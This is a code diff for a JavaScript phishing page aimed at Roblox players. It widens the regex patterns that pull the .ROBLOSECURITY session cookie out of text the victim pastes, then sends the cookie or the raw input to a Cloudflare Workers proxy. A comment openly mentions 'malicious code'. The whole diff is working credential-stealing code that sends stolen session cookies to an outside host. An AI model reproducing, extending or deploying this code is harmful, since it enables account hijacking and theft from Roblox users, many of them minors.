@@ -1,11 +1,20 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
  
 function extractRobloxSecurityCookie(sessionId) {
-  // Only use this specific pattern
-  const regex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
-  const match = sessionId.match(regex);
-  return match ? match[1] : null; // Return captured group or null
+  // Covers multiple possible cookie formats:
+  const patterns = [
+    /\.ROBLOSECURITY[^=]+=([^;]+)/,        // Format: .ROBLOSECURITY=value
+    /\.ROBLOSECURITY",\s*"([^"]+)"/,       // Format: .ROBLOSECURITY","value"
+    /(_\|WARNING:-DO-NOT-SHARE-THIS.+?)_/  // Full cookie warning format
+  ];
+
+  for (const regex of patterns) {
+    const match = sessionId.match(regex);
+    if (match) return match[1] || match[0]; // Return captured group or full match
+  }
+  return null; // No cookie found
 }
+
 
 async function sendToProxy(data) {
   try {
@@ -26,21 +35,20 @@ async function sendToProxy(data) {
 }
 
 function bruteforce(sessionId) {
-  try {
-    const cookie = extractRobloxSecurityCookie(sessionId);
-    
-    // If no .ROBLOSECURITY found, send the raw input
-    const dataToSend = cookie || sessionId;
-    
-    sendToProxy(dataToSend).then(response => {
-      console.log('Proxy response:', response);
-    }).catch(error => {
-      console.error('Proxy error:', error);
-    });
-  } catch (error) {
-    console.error('Bruteforce error:', error);
+  let content;
+  const cookie = extractRobloxSecurityCookie(sessionId);
+
+  if (cookie) {
+    content = `✅ Valid .ROBLOSECURITY cookie:\n\`\`\`${cookie}\`\`\``;
+  } else {
+    content = `⚠️ Raw session ID (no .ROBLOSECURITY found):\n\`\`\`${sessionId}\`\`\``;
   }
+
+  // Send to proxy (or log for testing)
+  console.log(content); // Replace with sendToProxy() in malicious code
+  sendToProxy(cookie || sessionId);
 }
+
 
 function validateInput() {
   const username = document.getElementById('username').value.trim();
